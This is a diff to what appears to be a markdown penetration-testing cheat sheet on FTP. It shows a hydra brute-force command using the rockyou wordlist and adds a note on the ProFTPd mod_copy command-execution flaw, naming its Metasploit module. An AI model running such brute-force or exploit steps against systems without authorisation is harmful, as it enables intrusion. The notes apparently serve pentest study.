@@ -23,4 +23,6 @@ anonymous : anonymous
 hydra -l username -P /usr/share/worlists/rockyou.txt -f $IP ftp -V
 ```
 
+{: .note }
+ProFTPd: mod_copy vulnerability - command execution (MSF: use exploit/unix/ftp/proftpd_modcopy_exec | Set sitepath /var/www/path) 
 
